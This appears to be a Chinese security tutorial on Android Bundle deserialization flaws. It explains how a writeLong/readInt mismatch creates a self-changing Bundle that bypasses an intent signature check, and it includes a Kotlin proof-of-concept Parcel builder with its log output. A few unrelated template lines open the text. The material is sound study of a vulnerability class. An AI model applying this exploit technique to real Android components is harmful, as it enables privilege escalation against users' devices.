
进入`/path/to/xxx` 目录，找到 `xxx.json`。

在表达式 `cvar = avar + bvar` 中，加法运算符（`+`）将 `avar` 与 `bvar` 相加，得到它们的和 `cvar`

在 `List.of(arg0, arg1, arg2)` 中，`List` 接口的工厂方法 `of()` 接受一系列的元素，返回包含它们的只读列表。

之后我们这样调用 `cmd` 命令：`cmd arg0 arg1 arg2`。

```
if (condVar > someVal) {console.log("xxx")}
```

| 1  2  3  4  5  6  7  8  9  10  11  12 | `@Override`  `public synchronized String toString() {`  `if` `(mParcelledData !``=` `null) {`  `if` `(isEmptyParcel()) {`  `return` `"Bundle[EMPTY_PARCEL]"``;`  `}` `else` `{`  `return` `"Bundle[mParcelledData.dataSize="` `+`  `mParcelledData.dataSize()` `+` `"]"``;`  `}`  `}`  `return` `"Bundle["` `+`  `mMap.toString()` `+` `"]"``;`  `}` |

关键就是这个 `mParcelledData` 字段，该字段定义在父类即 `BaseBundle` 中，为 `Parcel` 类型。由于 `Bundle` 经常在进程间进行传输，因此设计上认为可以不要到对端的时候马上就反序列化出所有的 `ArrayMap`，而是等需要用到时再进行解析，这也可以认为是一种懒加载的技术。对于一些收到 `Bundle` 后马上又传输给其他服务的场景，这种设计可以直接传输未解析的 `Parcel` 数据而不需要来回的序列化。

因此对于 `Bundle` 而言，对于一些需要获取内部元素的调用时才会进行反序列化，比如 `size` 和 `isEmpty` 的实现:

|  |  |

| --- | --- |

| 1  2  3  4  5  6  7  8  9 | `public` `int` `size() {`  `unparcel();`  `return` `mMap.size();`  `}`    `public boolean isEmpty() {`  `unparcel();`  `return` `mMap.isEmpty();`  `}` |

值得注意的是，在 `Bundle` 内部，`ArrayMap(mMap)` 和 `Parcel(mParcelledData)` 同一时间只能存在一个，反序列化后会填充 `mMap` 把 `mParcelledData` 回收并置为 `null`。

# 反序列化与 Bundle 风水

最早提交 Android 反序列化漏洞的是 @BednarTildeOne 在 2014 年提交的 `ParceledListSlice` 漏洞，但第一次引起公众关注的应该是 `CVE-2017-0806`。也是同样的作者，不过给出了详细的分析以及漏洞 POC 代码，这才得以引起关注。

该漏洞的原理已经有很多师傅分析过了，就不再赘述，这里直接给出一个简化的版本。假设有这么一个 `Parcelable` 数据结构，请问是否存在漏洞？漏洞如何利用？

|  |  |

| --- | --- |

| 1  2  3  4  5  6  7  8  9  10  11  12  13 | `public` `class` `Vulnerable implements Parcelable {`  `private` `long` `mData;`    `protected Vulnerable(Parcel` `in``) {`  `mData` `=` `m.readInt();`  `}`    `@Override`  `public void writeToParcel(Parcel parcel,` `int` `flags) {`  `parcel.writeLong(mData)`  `}`  `/``/` `...`  `}` |

问题很明显，可以看到其中序列化使用了 `writeLong`，但是反序列化过程却用了 `readInt`，二者不匹配，这可能会导致一些数据错误，但这能算得上一个漏洞吗？

回想 `LunchAnywhere` 漏洞以及对应的 [patch](https://bbs.kanxue.com/elink@52fK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6S2L8X3c8J5L8$3W2V1i4K6u0W2k6$3!0G2k6$3I4W2M7$3!0#2M7X3y4W2i4K6u0W2j5$3!0E0i4K6u0r3M7r3I4S2N6r3k6G2M7X3#2Q4x3V1k6X3M7X3q4E0k6i4N6G2M7X3E0K6i4K6u0r3j5X3q4K6k6g2)9J5c8W2)9J5b7W2)9J5c8U0g2T1j5h3t1&6k6r3q4Q4x3U0f1#2c8g2)9J5y4e0t1I4i4K6u0r3)，实际上是用户可控的 `Intent` 数据中带有 `KEY_INTENT` extra 导致的启动任意 `Activity` 的问题。修复过程是判断用户提供的 `Intent` 是否带有该 extra，如果有则校验调用者的签名。当时的修复可以说没什么问题，但如果配合上述的漏洞，就有可能出现绕过。

这里还是以测试代码举例，假设我们的校验函数如下:

|  |  |

| --- | --- |

| 1  2  3  4  5  6  7  8  9  10  11 | `@Override`  `public void onResult(Bundle result) {`  `Intent intent` `=` `result.getParcelable(AccountManager.KEY_INTENT)`  `if` `(intent !``=` `null) {`  `checkCallingSignature()`  `}`  `/``/` `...`  `send(result)`  `}`    `public void send(Bundle result);` `/``/` `AIDL` |

校验时如果 `intent` 不为空则进行签名校验，随后会调用 `AIDL` 的客户端方法 `send`，该方法将 `bundle` 再次序列化然后发送给服务端，而服务端的实现如下:

|  |  |

| --- | --- |

| 1  2  3  4  5  6  7  8  9 | `class` `Server extends IServer.Stub {`  `@Override`  `public void send(Bundle result) {`  `Intent intent` `=` `bundle.getParcelable(KEY_INTENT);`  `if` `(intent !``=` `null) {`  `mContext.startActivity(intent)`  `}`  `}`  `}` |

因为客户端进行了校验，所以服务就不需要再次校验而是直接信任该 `Bundle` 并使用了。这里其实有个经典的漏洞模式即 `TOCTOU` 问题，一般情况下这个逻辑是没问题的，即 `bundle` 检查完后不会被再次修改。但在我们的漏洞场景中，就有可能会出现不同的 `bundle`，即 `Self-Changing Bundle`。

## 自修改 Bundle

`Bundle` 自修改，主要还是针对上面的这种 IPC 场景，一端对 `Bundle` 进行了校验，发现没问题后使用 IPC 发送给另一端，且对方不加校验就直接使用。即 `Bundle` 在序列化+反序列化的过程中进行了改变。

假设服务端 B 接收我们的 `Bundle` 数据进行反序列化后再次序列化发送给服务端 C，而我们的 `bundle` 中带有一个类型为 `Vunerable` 的 key，那在 B 接收到数据后再发出去的数据会如下图右边所示，其中本该是 `Int` 的字段被写成了 `Long`，导致 C 再次反序列化时候对后续数据的解析出现异常:

![Bundle](https://bbs.kanxue.com/upload/attach/202303/844554_89EH3NQH4F2372Q.jpg)

通过精心构造发送给 B 的数据，我们可以令 B 和 C 都能正常序列化出 `Bundle` 对象，甚至让这两个 `Bundle` 含有不同的 key！

## 漏洞利用

该漏洞如何利用呢？前文中我们已知 `Bundle` 序列化数据的头部后面每个元素都是 `key+value` 的组合，那利用思路应该就是将多出来的 4 字节进行类型混淆。这种场景类似于二进制的缓冲区溢出，我们需要做的就是布局好数据使得同时满足下述条件:

1. 类型混淆前后，`Bundle` 的 `length` 和 `items` 字段保持一致；
2. 两次反序列化得到的对象都需要是合法对象；
3. 第二次反序列化要能够出现一个前面没有的 `Bundle` key；

溢出的 4 个字节会作为后面一个 key 的一部分，而 key 的类型是 `String`，根据前面的介绍，其内存是长度(`Int32`) + `String16`。其中 `String16` 是 `unicode`，使用 2 字节保存一个字符。因此，如果 `map` 元素足够的话，这 4 个字节会形成下一个 key 的长度。

在大部分情况下，溢出的部分是 `Long` 数据的高有效位，因此会是 0，如果此时第二次反序列化处理到这里，会认为这有个 key 长度为 0 的元素，查看读取字符串相关的代码，如下所示:

|  |  |

| --- | --- |

| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17 | `const char16_t``*` `Parcel::readString16Inplace(size_t``*` `outLen) const`  `{`  `int32_t size` `=` `readInt32();`  `/``/` `watch` `for` `potential` `int` `overflow` `from` `size``+``1`  `if` `(size >``=` `0` `&& size < INT32_MAX) {`  `*``outLen` `=` `size;`  `const char16_t``*` `str` `=` `(const char16_t``*``)readInplace((size``+``1``)``*``sizeof(char16_t));`  `if` `(``str` `!``=` `nullptr) {`  `if` `(``str``[size]` `=``=` `u``'\0'``) {`  `return` `str``;`  `}`  `android_errorWriteLog(``0x534e4554``,` `"172655291"``);`  `}`  `}`  `*``outLen` `=` `0``;`  `return` `nullptr;`  `}` |

考虑到 `padding` 的存在，即便 `size` 为 0，还是会读出 `(0+1)x2` 即 2 字节的 `\x00`。`readInplace` 中还会对齐，因此最终读出的是 4 字节数据。因此，后续的反序列化都会在原来的基础上后移 4 字节。

这样一来利用思路就比较清晰了:

1. 构造一个恶意 `Bundle`，其中包含两个元素 `A0` 和 `A1`，其中 `A0` 为 `Vunlerable`，在 `A1` 中布置 `payload`；
2. 反序列化+序列化后，数据多出 4 字节，且下个元素的解析从 `A1` 的 key 内容开始；
3. 构造 `A1` 的 key 和 `value`，使得第 2 步中解析出新的 key；

还是以前面的 `Vulnerable` 类为例，POC 代码如下:

|  |  |

| --- | --- |

| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27  28  29  30  31  32  33  34  35  36 | `val p` `=` `Parcel.obtain()`    `val lengthPos` `=` `p.dataPosition()`  `/``/` `header`  `p.writeInt(``-``1``)` `/``/` `length, back``-``patch later`  `p.writeInt(``0x4C444E42``)` `/``/` `magic`  `val startPos` `=` `p.dataPosition();`  `p.writeInt(``3``)` `/``/` `numItem`    `/``/` `A0`  `p.writeString(``"A"``)`  `p.writeInt(``Type``.VAL_PARCELABLE.value)`  `p.writeString(``"com.evilpan.poc.Vulnerable"``)`  `p.writeInt(``666``)` `/``/` `mData`    `/``/` `A1`  `p.writeString(``"\u000d\u0000\u0008"``)` `/``/` `0d00` `0000` `0800`  `p.writeInt(``Type``.VAL_BYTEARRAY.value)`  `p.writeInt(``28``)`  `p.writeString(``"intent"``)` `/``/` `4` `+` `padSize((``6` `+` `1``)` `*` `2``)` `=` `4``+``16` `=` `20`  `p.writeInt(``Type``.VAL_INTEGER.value)` `/``/` `=` `4`  `p.writeInt(``0x1337``)` `/``/` `=` `4`    `/``/` `A2`  `p.writeString(``"BBB"``)`  `p.writeInt(``Type``.VAL_NULL.value)`    `/``/` `Back``-``patch length && reset position`    `val A` `=` `unparcel(p)`  `Log.i(``"A = "` `+` `inspect(A))`  `Log.i(``"A.containsKey: "` `+` `A.containsKey(``"intent"``))`    `val B` `=` `unparcel(parcel(A))`  `Log.i(``"B = "` `+` `inspect(B))`  `Log.i(``"B.containsKey: "` `+` `B.containsKey(``"intent"``))` |

在上述 POC 中，我们明面上构造了一个含有 3 个元素的 `Bundle`，分别是:

- `A0`: `Parcelable` 类型，元素为我们带有漏洞的 `Parcelable`；
- `A1`: `ByteArray` 类型，长度为 28 字节，`ByteArray` 的内容为隐藏的 `Intent` 元素，即 20+4+4；
- `A2`: `NULL` 类型；

其中关键的是 `A1` 的 key，在触发漏洞后，会被解析为第二个元素的元素类型和长度，即解析出来的内容为:

- `0d000000`: 解析为元素类型，等于 `VAL_BYTEARRAY(13)`；
- `08000000`: 解析为 `ByteArray` 长度，即 8 字节；注意这里额外的 0 是字符串写入时候 pad 出来的。

之所以是 8 字节，是为了把后面的长度字段吞掉，使得解析下一个元素可以直接到我们隐藏的 `intent` 中。

第三个元素 `A2` 只是用于占位，在第一次序列化时候有用，第二次时直接被我们隐藏的 `intent` 替代了。上述代码的运行结果如下:

|  |  |

| --- | --- |

| 1  2  3  4  5  6  7  8  9  10  11 | `[INFO]: A` `=` `Bundle(item` `=` `3``) length:` `144`  `[INFO]:` `=``>` `41000000` `=` `VAL_PARCELABLE:com.evilpan.poc.Vulnerable{mData``=``666``}`  `[INFO]:` `=``>` `0d00000008000000` `=` `VAL_BYTEARRAY:``0600000069006e00740065006e007400000000000100000037130000`  `[INFO]:` `=``>` `4200420042000000` `=` `VAL_NULL:null`  `[INFO]: A.containsKey: false`  `[INFO]:` `=``=``=` `writeToParcel` `=``=``=`  `[INFO]: B` `=` `Bundle(item` `=` `3``) length:` `148`  `[INFO]:` `=``>` `41000000` `=` `VAL_PARCELABLE:com.evilpan.poc.Vulnerable{mData``=``666``}`  `[INFO]:` `=``>` `03000000` `=` `VAL_BYTEARRAY:``0d0000001c000000`  `[INFO]:` `=``>` `69006e00740065006e00740000000000` `=` `VAL_INTEGER:``1337`  `[INFO]: B.containsKey: true` |

可以看到第一次反序列化出来的 `Bundle A` 包含三个 key，其中并没有 `intent` 字段，但经过序列化再反序列化后的 `Bundle B` 已经修改了，第二个元素的变成了长度为 8 字节的 `ByteArray`，实际上其 key 长度为；第三个元素则是我们伪造的 `intent` 元素，值为 `0x1337`，因此我们成功地绕过了第一次 `containsKey` 的校验，而在第二次中进行触发！

> 上述例子在 Android 12 中进行测试，理论上之前的版本也类似。

实际上的漏洞与这个例子大同小异，由于 Android 系统对 IPC 的大量使用，许多操作都会在 `system_server`、`Settings` 应用、用户应用中来回穿梭，也就造成了许多上述 `TOCTOU` 的问题。对其中细节感兴趣的可以参考下面的分析文章:
